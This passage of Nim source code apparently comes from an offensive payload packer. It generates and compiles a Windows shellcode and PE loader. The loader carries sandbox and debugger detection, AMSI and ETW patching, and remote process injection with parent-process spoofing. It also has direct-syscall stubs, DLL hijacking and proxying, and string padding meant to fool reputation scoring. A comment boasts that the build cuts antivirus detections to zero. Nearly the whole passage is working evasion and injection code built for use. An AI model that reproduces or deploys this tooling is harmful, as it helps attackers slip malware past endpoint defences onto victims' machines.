    when defined(DInvoke):
        discard MySleep(1500)
    else:
        Sleep(1500)

    when defined(DInvoke):
        dwEnd = MyGetTickCount()
    else:
        dwEnd = GetTickCount()
    var dwDiff = dwEnd - dwStart
    # If we slept for less than 2 seconds, we are in a VM
    if (dwDiff < 1300):
        quit()
    else:
        when defined(verbose):
            echo obf("[*] We don't appear to be in a sandbox according to the Sleep time")
        when not defined(AntiDebug):
            envkey2 = envkey & "{lastFour}"
        else:
            envkey2 = envkey2 & "{lastTwo}"
        when defined(verbose):
            echo obf("[*] Final Key: ") & envkey2
accelerated_sleep()
"""

let AmsiNtCreateSectionDecryptStub = fmt"""

var dctx2: ECB[aes256]
var key2: array[aes256.sizeKey, byte]
discard calcHard()
var envkey2: string = obf("{envkey}")

var expandedkey2 = toByteSeq(envkey2)
discard calcHard()
if ((len(expandedkey2) mod aes256.sizeBlock) != 0):
    when defined(verbose):
        echo "[*] Key length not a multiple of KeySize: ", aes256.sizeBlock
        echo "[*] Length: " & $len(expandedkey2)
        echo "[*] Padding Key with null bytes"
    expandedkey2 = expandedkey2 & newSeq[byte](aes256.sizeBlock - (len(expandedkey2) mod aes256.sizeBlock))
    when defined(verbose):
        echo "[*] New Length: " & $len(expandedkey2)

moveMemory(addr key2[0], addr expandedkey2[0], len(expandedkey2))
discard calcHard()

"""

let RemoteModuleHandleStub = """

# Credit to @whydee86 - https://github.com/whydee86/SnD_AMSI/blob/main/Remote.nim


proc ConvertToString(CharArr :array[256,char]): string =
    var index = 0
    while CharArr[index] != '\x00':
        result.add(CharArr[index])
        index += 1

proc GetRemoteModuleHandle  (hProcess:HANDLE, ModuleName: string): HMODULE =
    var 
        modEntry : MODULEENTRY32A
        snapshot : HANDLE

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,GetProcessId(hProcess))
    if snapshot != INVALID_HANDLE_VALUE:
        modEntry.dwSize = DWORD(sizeof(MODULEENTRY32A))
        if Module32FirstA(snapshot, addr modEntry):
            while Module32NextA(snapshot, addr modEntry):
                if toLowerAscii(ConvertToString(modEntry.szModule)) == toLowerAscii(ModuleName):
                    return modEntry.hModule
    CloseHandle(snapshot)
    return 0

proc GetRemoteProcAddress  (hProcess : HANDLE, hModule : HMODULE, FuncName : string): FARPROC =
    var
        baseModule : UINT_PTR = cast[UINT64](hModule)
        dosHeader : IMAGE_DOS_HEADER
        ntHeader : IMAGE_NT_HEADERS
        exportDirectory : IMAGE_EXPORT_DIRECTORY
        ExportTable : DWORD = 0
        ExportFunctionTableVA : UINT_PTR = 0
        ExportNameTableVA : UINT_PTR = 0
        ExportOrdinalTableVA : UINT_PTR = 0
        ExportNameTable: seq[DWORD]
        ExportFunctionTable: seq[DWORD]
        ExportOrdinalsTable: seq[WORD] 
        MinFunNumber : UINT_PTR = 0
        Func : DWORD = 0
        Ord : WORD = 0
        CharIndex : UINT_PTR = 0
        TempChar : char
        Done : bool = false
        TempFunctionName : string = ""

    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule), addr dosHeader, sizeof(dosHeader), NULL) == 0:
        when defined(verbose):
            echo obf("Failed to Read the DOS header and check it's magic number: "), GetlastError()
        return NULL
    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + dosHeader.e_lfanew), addr ntHeader, sizeof(ntHeader), NULL) == 0:
        when defined(verbose):
            echo obf("Failed to Read and check the NT signature: "), GetlastError()
        return NULL

    ExportTable = (ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).VirtualAddress
    
    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportTable), addr exportDirectory, sizeof(exportDirectory), NULL) == 0:
        when defined(verbose):
            echo obf("Failed to Read the main export table "), GetlastError()

    ExportFunctionTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfFunctions
    ExportNameTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNames
    ExportOrdinalTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNameOrdinals
    
    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
        Func = 0
        Ord = 0 
        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportNameTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
            when defined(verbose):
                echo obf("Failed to copy name table "), GetlastError()
            return NULL
        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportOrdinalTableVA + FunNum * sizeof(WORD)), addr Ord, sizeof(Ord), NULL) == 0:
            when defined(verbose):
                echo obf("Failed to copy Ordinal table "), GetlastError()
            return NULL
        ExportNameTable.add(Func)
        ExportOrdinalsTable.add(Ord)
    
    for FunNum in MinFunNumber .. exportDirectory.NumberOfFunctions:
        Func = 0
        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportFunctionTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
            when defined(verbose):
                echo obf("Failed to copy fucntion table "), GetlastError()
            return NULL
        ExportFunctionTable.add(Func)
    
    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
        CharIndex = 0
        Done = false
        TempFunctionName = ""
        while Done == false:
            if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportNameTable[FunNum] + CharIndex), addr TempChar, sizeof(TempChar), NULL) == 0:
                when defined(verbose):
                    echo obf("Failed to read the names of the functions"), GetlastError()
                return NULL
            if TempChar == '\0' or TempChar == '`' or TempChar == '\176':
                Done = true
            else:
                TempFunctionName.add(TempChar)
            CharIndex += 1
        if toLowerAscii(TempFunctionName) == toLowerAscii(FuncName):
            return cast[FARPROC](baseModule + ExportFunctionTable[ExportOrdinalsTable[FunNum]])
    when defined(verbose):
        echo obf("[X] Proc name does not exits")
    return NULL

"""


proc genEnglishwords (nuofWords: int): string =

  proc pumpenglishwords (numberofWords: int): seq[string] =

    var englishdicts: seq[string]
    var output: seq[string]
    var dictionary: string
    when system.hostOS == "windows":
        dictionary = fmt"{packerPath}\\Dicts\\englishwords.txt"
    else:
        dictionary = fmt"{packerPath}/Dicts/englishwords.txt"
    for line in lines dictionary:
      englishdicts.add(line)
    for i in 1 .. numberofWords:
      output.add(sample(englishdicts))
    return output

  proc rndStr: string =
    for _ in 0.. 10:
      add(result, char(rand(int('a') .. int('z'))))
    
  var rand1: seq[string] = pumpenglishwords(nuofWords)
  var rand2: string = rndStr()

  let englishwordsstub = fmt"""

var {rand2} = {rand1}

"""
  return englishwordsstub


proc genTrustedwords (nuofWords: int): string =

  proc pumpTrustedwords (numberofWords: int): seq[string] =

    var trusteddicts: seq[string]
    var output: seq[string]
    var dictionary: string
    when system.hostOS == "windows":
        dictionary = fmt"{packerPath}\\Dicts\\trustedStrings.txt"
    else:
        dictionary = fmt"{packerPath}/Dicts/trustedStrings.txt"
    for line in lines dictionary:
      trusteddicts.add(line)
    for i in 1 .. numberofWords:
      output.add(sample(trusteddicts))
    return output
    
  var rand1: seq[string] = pumpTrustedwords(nuofWords)
  var rand2: string = rndStr()

  let trustedwordsstub = fmt"""

var {rand2} = {rand1}

"""

  return trustedwordsstub

let DLLNoHideStub = """

    when defined(lib_only):
        # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
        # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
        AttachConsole(-1)

"""

let DllStub = """
import dynlib
proc NimMain() {.cdecl, importc.}

when defined(notcloned):
    proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
        NimMain()
        return true

    proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
        NimMain()
        return true

    proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
        NimMain()
        return true
"""

let DLLHijackStub = """

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  
  if fdwReason == DLL_PROCESS_ATTACH:
    NimMain()
    when defined(cloned):
        var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
        CloseHandle(threadHandle)
  if fdwReason == DLL_THREAD_ATTACH:
    NimMain()
  #if fdwReason == DLL_PROCESS_ATTACH:
  #  NimMain()
  return true

"""

let DLLProxyStub = """

import dynlib
proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  
  if fdwReason == DLL_PROCESS_ATTACH:
    var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
    CloseHandle(threadHandle)
  #if fdwReason == DLL_THREAD_ATTACH:
  #  NimMain()
  #if fdwReason == DLL_PROCESS_ATTACH:
  #  NimMain()
  return true

"""

let DllCustomExportStub = """
proc `FUNC_EXPORT`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
    NimMain()
    return true
"""

let APIHideStub = """

#[ Crappy behaviours here , maybe I'll fix it later ]
when defined(DInvoke):
    const
      USER32_DLL* = obf("user32.dll")

    type
      GetConsoleWindow_t* = proc (): HANDLE {.stdcall.}
      ShowWindow_t* = proc (hwnd: HANDLE, nCmdShow: int): BOOL {.stdcall.}
  
    const
      GetConsoleWindow_OBF * = obf("GetConsoleWindow")
      ShowWindow_OBF * = obf("ShowWindow")
  
    var MyGetConsoleWindow*: GetConsoleWindow_t
    var MyShowWindow*: ShowWindow_t

    MyGetConsoleWindow = cast[GetConsoleWindow_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetConsoleWindow_OBF, 0, FALSE)))

    MyShowWindow = cast[ShowWindow_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(USER32_DLL, TRUE)), ShowWindow_OBF, 0, FALSE)))


    var hwnd: HANDLE = MyGetConsoleWindow()
    var hidden: bool = MyShowWindow(hwnd, SW_HIDE)
    when defined(verbose):
        echo "Hidden:", hidden

else:]#
var hwnd: HANDLE
hwnd = GetConsoleWindow()
ShowWindow(hwnd, SW_HIDE)
"""

let SleepyCryptLoopExecute = """
SleepyCryptLoop(10000)
"""

let NotepadProcIDStub * = fmt"""


    proc FindPidByName (processName : string):DWORD =
        try:
            var 
                entry : PROCESSENTRY32A
                snapshot : HANDLE
                pid : DWORD = 0
            snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            if snapshot != INVALID_HANDLE_VALUE:
                entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
                if Process32FirstA(snapshot,addr entry):
                    while Process32NextA(snapshot,addr entry):
                        pid = entry.th32ProcessID
                        if ($(entry.szExeFile).join()).contains(processName):
                            result = pid
        except: 
            echo obf("Process ID not found")

    var remoteProcID: DWORD
    
    # We will re-Use this Handle to avoid using NtOpenProcess again later and it's corresponding Kernel Callback
    var tProcess: HANDLE
    
    proc StartProcess(): void =
        var 
            lpSize: SIZE_T
            pi: PROCESS_INFORMATION
            ps: SECURITY_ATTRIBUTES
            si: STARTUPINFOEX
            status: WINBOOL
            tHandle: HANDLE
            tProcPath: WideCString
            ts: SECURITY_ATTRIBUTES
        
        ps.nLength = sizeof(ps).cint
        ts.nLength = sizeof(ts).cint
        si.StartupInfo.cb = sizeof(si).cint


        when defined spoof_args:
            tProcPath = newWideCString(obf(r"{customspawnprocess}") & " " & obf("{spoofArgs}"))
        else:
            tProcPath = newWideCString(obf(r"{customspawnprocess}"))

        when defined(blockDLLs) or (obf("{parentProcess}") != ""):
            InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
            si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
            InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)

            when defined(blockDLLs):
                const
                    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
                var
                    policy: DWORD64

                policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
                
                status = UpdateProcThreadAttribute(
                    si.lpAttributeList,
                    0,
                    cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
                    addr policy,
                    sizeof(policy),
                    NULL,
                    NULL)

            if (obf("{parentProcess}") != ""):
                var
                    ppHandle: HANDLE
                    ppid: DWORD

                ppid = FindPidByName(obf("{parentProcess}"))                    
                ppHandle = OpenProcess(PROCESS_ALL_ACCESS,false, ppid)
                
                if (ppHandle == 0):
                    when defined(verbose):
                        echo obf("Failed to open parent process handle, no permissions??")
                    ppHandle = HANDLE(-1) # Current Process

                status = UpdateProcThreadAttribute(
                    si.lpAttributeList,
                    0,
                    cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
                    addr ppHandle,
                    sizeof(ppHandle),
                    NULL,
                    NULL)

        status = CreateProcess(
            NULL,
            cast[LPWSTR](tProcPath),
            ps,
            ts, 
            FALSE,
            EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
            NULL,
            r"C:\Windows\system32\",
            addr si.StartupInfo,
            addr pi)

        tProcess = pi.hProcess
        remoteProcID = pi.dwProcessId
        tHandle = pi.hThread

    StartProcess()


    when defined(verbose):
        echo obf("[*] Sleeping in between for: "), {sleepinbetween}

    when defined(sleepinbetween):
        HowMuchTimeWouldYouLikeToSleep({sleepinbetween})

    when defined(verbose):
        echo obf("[*] Target Process: "), remoteProcID


"""
let MainStub * = """

when not defined(DInvoke):
    when defined(unhook):
        from winim import GetModuleInformation,MODULEINFO,LPMODULEINFO

proc main(lpParameter: LPVOID) : DWORD {.stdcall.} =

"""

let BeingDebugged * = fmt"""
if(AmIDebugged()):
  quit()
else:
    if(isHeapGrowable()):
        when defined(verbose):
            echo obf("[*] We don't appear to be Debugged, continuing...")
        if(CheckHardwareBreakPoints()):
            when defined(verbose):
                echo obf("[*] No hardwareBreakpoints detected...")
            if(CreatedInterrupt()):
                when defined(verbose):
                    echo obf("[*] No strange interrupts detected...")
                when defined(SkipDefaultSandBoxChecks):
                    envkey2 = envkey & "{lastFour}"
                else:    
                    envkey2 = envkey & "{fourthtosecondlast}"
            else:
                when defined(verbose):
                    echo obf("[*] Strange Interrupt Detected, quit.")
    else:
        quit(1)

"""

let CheckHardwareBreakPoints * = fmt"""

proc CheckHardwareBreakPoints(): bool =
    var
        ctx: CONTEXT
        hThread: HANDLE
        hwbp: DWORD
        i: int
        status: bool = false

    hThread = GetCurrentThread()
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
    status = GetThreadContext(hThread, addr ctx)

    if (status):
        hwbp = DWORD(ctx.Dr0) or DWORD(ctx.Dr1) or DWORD(ctx.Dr2) or DWORD(ctx.Dr3)
        if (hwbp != 0):
            when defined(verbose):
                echo obf("\r\n[*] Hardware Breakpoint Detected, quit.\r\n")
            status = false
        else:
            status = true
            when defined(verbose):
                echo obf("\r\n[*] No Hardware Breakpoints Detected, continuing...\r\n")
    else:
        status = false

    result = status

"""

let CreatedInterruptStub * = """

proc VEHHandler (pExceptInfo: PEXCEPTION_POINTERS): LONG {.stdcall.}=
    #  process all exceptions, including EXCEPTION_ILLEGAL_INSTRUCTION
    result = EXCEPTION_CONTINUE_EXECUTION

proc CreatedInterrupt(): bool =
    when defined(verbose):
        echo obf("[*] Adding Exception Handler...")
    AddVectoredExceptionHandler(1, VEHHandler)
    when defined(verbose):
        echo obf("[*] Raising exception...")
    RaiseException(EXCEPTION_BREAKPOINT, 0, 0, nil)
    when defined(verbose):
        echo obf("[*] Removing ExceptionHandler...")
    RemoveVectoredExceptionHandler(VEHHandler)
    return true
    
"""

var stub = Cryptstub1
if(macPayload):
    stub.add(macPayloadStub)
stub.add(Cryptstub15)

if (not noDInvoke):
    stub.add(DInvokeStubfirst)
    stub.add(DInvokeGetPEB)
    stub.add(DInvokeStubSecond)
    stub.add(DInvokeStubThird)
    stub.add(DInvokeStubFourth)
    stub.add(DInvokeBaseStub)

if (getfreshstub):
    stub.add(GetSyscallStub)

if(pump):
    # makes no sense to import nimstrenc when strings should be visible in the binary.
    stub =  stub.replace("    import nimstrenc", "    from winim import MODULEENTRY32A")
    for m in pumpargs:
        if(m == "words"):
            echo "[*] Adding words"
            stub.add(genEnglishwords(rand(4750..7800)))
        if (m == "reputation"):
            echo "[*] Adding reputation"
            stub.add(genTrustedwords(rand(3500..6200)))

if(antidebug):
    stub.add(AntiDebugPEBStub)
    stub.add(IsDebuggerPresentStub)
    stub.add(CheckHardwareBreakPoints)
    stub.add(CreatedInterruptStub)
    stub.add(BeingDebugged)

stub.add(getRandStubNoTab())

if(sandbox):
    if (not noDInvoke): stub.add(DInvokeSandBoxStub)
    for m in sandboxchecks:
        if(m == "Domain"):
            stub.add(DomainCheckStub)
            stub.add(DomainCheckStub1)
        if (m == "DiskSpace"):
            stub.add(DiskSpaceStub)
        if (m == "DomainJoined"):
            stub.add(DomainJoinStub)
        if (m == "MemorySpace"):
            stub.add(MemorySpaceStub)
        if (m == "Emulated"):
            stub.add(VirtualAlloxExNumaCheckStub)
        if (m == "WindowChanges"):
            stub.add(WindowChangeStub)
if (apihide):
    stub.add(APIHideStub)

if(defaultSandBoxChecks):
    stub.add(Accelerated_sleepStub)

if(gosleep or remoteETWpatch or remoteAMSIpatch):
    stub.add(SleepStubFirst)
    if (gosleep):
        stub.add(SleepStubSecond)

stub.add(getRandStubNoTab())


if (syswhispers):
    if(jump):
        if (not compileX86):
            stub.add(WhispersJumpStub)
        else:
            stub.add(WhispersJumpStubX86)
    else:
        if (not compileX86):
            stub.add(WhispersStub)
        else:
            stub.add(WhispersStubX86)

if(hellsgate):
    stub.add(HellsgateStub)
    stub.add(HellsgateAllocDelegate)
    stub.add(HellsgateProtectDelegate)
    stub.add(HellsgateWriteDelegate)
    stub.add(HellsgateNtCloseDelegate)
    if(remoteMapSection):
        stub.add(HellsgateNtMapViewOfSectionDelegate)
        stub.add(HellsgateNtCreateSectionDelegate)
    if (peload and (not localinject)):
        stub.add(HellsgateNtCreateThreadExDelegate)
    elif(localCreateThread or remoteETWpatch or remoteAMSIpatch):
        stub.add(HellsgateNtCreateThreadExDelegate)
    if(not localinject or remoteETWpatch or remoteAMSIpatch):
        stub.add(HellsgateNtOpenProcessDelegate)
        stub.add(HellsgateNtCreateThreadExDelegate)
    if(localinject and useQueueAPC):
        stub.add(HellsgateNtTestAlertDelegate)
    if(useQueueAPC):
        stub.add(HellsgateNtQueueApcThreadDelegate)

if (AMSICreateSectionHook):
    stub.add(AmsiNtCreateSectionDecryptStub)
    stub.add(AMSINtCreateSectionHookStubFirst)

if(AMSI or ETW):
    stub.add(HardwareBreakpointStub)
    if(AMSI):
        stub.add(AMSIExceptionHandlerStub)
    if(ETW):
        stub.add(ETWExceptionHandlerStub)

if (AMSIPatch or AMSIProviderPatch or ETWPatch or peload or (localinject == false) or selfdelete):
    if (not noDInvoke):
        stub.add(DInvokeLoadLibraryAGetProcAddress)
        if (selfdelete):
            stub.add(DInvokeSelfDeleteStubs)

if (remoteETWpatch or remoteAMSIpatch or jmpEntry):
    stub.add(RemoteModuleHandleStub)
    #if (unhook == false):
    #    if (not noDInvoke): stub.add(DInvokeGetModuleHandleADelegate)

if(jmpEntry):
    stub.add(CustomThreadEntryStubFirst)

if(dripallocate):
    stub.add(DripAllocateStubFirst)

stub.add(MainStub)

stub.add(getRandStub())

if(getfreshstub):
    stub.add(RetrieveSyscallStubs)

if(unhook):
    if(hellsgate):
        if (not noDInvoke):
            stub.add(DInvokeUnhookStubs)
    elif(getfreshstub):
        if (not noDInvoke):
            stub.add(DInvokeUnhookStubs)
    elif(syswhispers):
        if (not noDInvoke):
            stub.add(DInvokeUnhookStubs)
    stub.add(UnhookNtdllStub)

stub.add(getRandStub())

if (retrieveFromFile):
    stub.add(ShellcodefromFileStub)
elif (retrieveFromURL):
    stub.add(ShellcodefromURLStub)

# Only decrypt when sandbox Checks/Unhooking/Sleep is done
stub.add(getRandStub())
stub.add(Cryptstub2)
stub.add(getRandStub())
stub.add(getRandStub())
stub.add(Cryptstub3)
stub.add(getRandStub())
stub.add(getRandStub())

if(jmpEntry):
    stub.add(CustomThreadEntryStubSecond)

if(dripallocate):
    stub.add(DripAllocateStubSecond)

if (selfdelete):
    stub.add(FileDeleteStub)
stub.add(getRandStub())
if (localinject):
    if(AMSI):
        stub.add(AMSIStub)
    elif(AMSIPatch):
        stub.add(AMSIPatchStub)
    elif(AmsiProviderPatch):
        stub.add(AMSIProviderPatchStub)
    elif(AMSICreateSectionHook):
        stub.add(AMSINtCreateSectionHookStub)
    if(ETWPatch):
        stub.add(ETWPatchStub)
    if (ETW):
        if (COMVARETW):
            stub.add(ETWCOMVARStub)
        else:
            stub.add(ETWStub)
stub.add(getRandStub())
stub.add(getRandStub())
if (peload):
    if (localinject):
        if (embeddedArguments):
            stub.add(PatchargsFuncs)
        if (hellsgate):
            stub.add(PELoadStub)
        elif(getfreshstub):
            stub.add(PELoadStub)
        elif(syswhispers):
            stub.add(PELoadStub)
        stub.add(getRandStub())
    else:   
        if (hellsgate):
            if (processname == ""):
                stub.add(NotepadProcIDStub)
                if (useQueueAPC):
                    stub.add(RemoteForceSleepStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_notepad)
            else:
                stub.add(ShellcoderemoteinjectStub_customprocfirst)
                stub.add(ShellcoderemoteinjectStub_customprocseccond)
                stub.add(ShellcoderemoteinjectStub_customprocID)
                if (useQueueAPC):
                    stub.add(RemoteForceSleepStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_customprocthird)
            if (remoteMapSection):
                stub.add(ShellcodeRemoteInjectMapSection)
            else:
                stub.add(ShellcoderemoteinjectStub)
            stub.add(getRandStub())
            stub.add(getRandStub())

if (shellcode):
    if (localinject):
        stub.add(getRandStub())
        stub.add(LocalInjectStub)
        stub.add(getRandStub())
    else:
        stub.add(getRandStub())
        if (hellsgate):
            if (processname == ""):
                stub.add(NotepadProcIDStub)
                if (useQueueAPC):
                    stub.add(RemoteForceSleepStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_notepad)
            else:
                stub.add(ShellcoderemoteinjectStub_customprocfirst)
                stub.add(ShellcoderemoteinjectStub_customprocseccond)
                stub.add(ShellcoderemoteinjectStub_customprocID)
                if (useQueueAPC):
                    stub.add(RemoteForceSleepStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_customprocthird)
        elif(syswhispers):
            if (processname == ""):
                stub.add(getRandStub())
                stub.add(NotepadProcIDStub)
                if (useQueueAPC):
                    stub.add(RemoteForceSleepStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_notepad)
            else:
                stub.add(ShellcoderemoteinjectStub_customprocfirst)
                stub.add(ShellcoderemoteinjectStub_customprocseccond)
                stub.add(ShellcoderemoteinjectStub_customprocID)
                if (useQueueAPC):
                    stub.add(RemoteForceSleepStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_customprocthird)
        elif (getfreshstub):
            stub.add(getRandStub())
            if (processname == ""):
                stub.add(NotepadProcIDStub)
                if (useQueueAPC):
                    stub.add(RemoteForceSleepStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchAMSIStub)
                stub.add(getRandStub())
                stub.add(ShellcoderemoteinjectStub_notepad)
            else:
                stub.add(ShellcoderemoteinjectStub_customprocfirst)
                stub.add(ShellcoderemoteinjectStub_customprocseccond)
                stub.add(ShellcoderemoteinjectStub_customprocID)
                if (useQueueAPC):
                    stub.add(RemoteForceSleepStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_customprocthird)
        if (remoteMapSection):
            stub.add(ShellcodeRemoteInjectMapSection)
        else:
            stub.add(ShellcoderemoteinjectStub)
        stub.add(getRandStub())

if(dll_out or cpl):
    if ((hide == false) and (apiHide == false)):
        stub.add(DLLNoHideStub)

if (csharp):
    stub.add(getRandStub())
    if (noArgs):
        stub.add(LoadAssemblyStub)
        stub.add(getRandStub())
        stub.add(LoadAssemblyStubNoArgs)
        stub.add(getRandStub())
    else:
        stub.add(getRandStub())
        stub.add(LoadAssemblyStub)
        stub.add(getRandStub())
        stub.add(LoadAssemblyStubArgs)

if (pump):
    for m in pumpargs:
        if(m == "words"):
            stub.add(genEnglishwords(rand(4750..7800)))

if (sleepycrypt):
    stub.add(LocalInjectGetSyscallStubSleepStub)
    #stub.add(SleepyCryptLoopExecute)

if(dll_out or cpl):
    if (dllProxy):
        stub.add(DLLProxyStub)
    else:
        stub.add(DllStub)
        if(dllhijack):
            stub.add(DLLHijackStub)
    for f in dllexportfunctions:
        stub.add(DllCustomExportStub)
        stub = stub.replace("FUNC_EXPORT", f)

if(service):
    if(dll_out):
        stub.add(ServiceDllStub)
    else:
        stub.add(ServiceStub)

if (debugMode):
    stub = stub.replace("import nimstrenc", "from winim import MODULEENTRY32A")

writeFile("Loader.nim", stub)
echo "Written Loader.nim -> \n\n"

var randValue: string = rndStr(8)
if(dllProxy):
    # No Support for multiple DLL files at the moment. So the last one found will be used.
    var paths: seq[string] = @[]
    when system.hostOS == "windows":
        for path in walkFiles(fmt"{packerpath}\\build\\*.dll"):
            paths.add path
    else:
        for path in walkFiles(fmt"{packerpath}/build/*.dll"):
            paths.add path
    if paths == @[]:
        echo fmt"No DLL files found in the {packerpath}/build/ folder. You need to put the legit DLL to proxy into this directory. Exiting..."
        quit(1)
    for dllpath in paths:
        when system.hostOS == "windows":
            echo os.execShellCmd(fmt"copy {dllpath} {packerpath}\\{randValue}.dll")
            echo os.execShellCmd(fmt"{packerpath}\\dllProxy\\gen_def.exe {randValue}.dll > {packerpath}/build/{randValue}.def")
        else:
            echo exec_cmd_ex(fmt"cp {dllpath} {packerpath}/{randValue}.dll")
            echo exec_cmd_ex(fmt"python {packerpath}/dllProxy/gen_def.py {randValue}.dll > {packerpath}/build/{randValue}.def")


# --hint[Pattern]:off is used to not break nim-strenc - https://github.com/Yardanico/nim-strenc/issues/6
# This is only for the best size: -d:danger -d:strip --passc=-flto --passl=-flto / But it also bypasses three more vendors on antiscan.me from 3 up to 0 detections :)
# --passc=-flto --passl=-flto are not compatible with Hellsgate as they break the functionality

var basicCompileFlags: string = ""


if (hellsgate):
    echo "Replacing === with \"\"\" for ASM stubs before compiling:\n"
    discard exec_cmd_ex("nimgrep === --replace \\\"\\\"\\\" Loader.nim")

if (llvm):
    echo "[+] Using LLVM-Obfuscator to compile"
    if system.hostOS == "linux":
        # Stolen from https://github.com/icyguider/Nimcrypt2/blob/main/nimcrypt.nim#L710
        var result = execCmdEx("x86_64-w64-mingw32-clang -v")
        if "Obfuscator-LLVM" in result.output:
            let ochars = {'A'..'Z','0'..'9'}
            var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
            #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
        else:
            echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
            quit()
    when system.hostOS == "windows":
        var result = execCmdEx("clang -v")
        if "Obfuscator-LLVM" in result.output:
            let ochars = {'A'..'Z','0'..'9'}
            var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
            #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
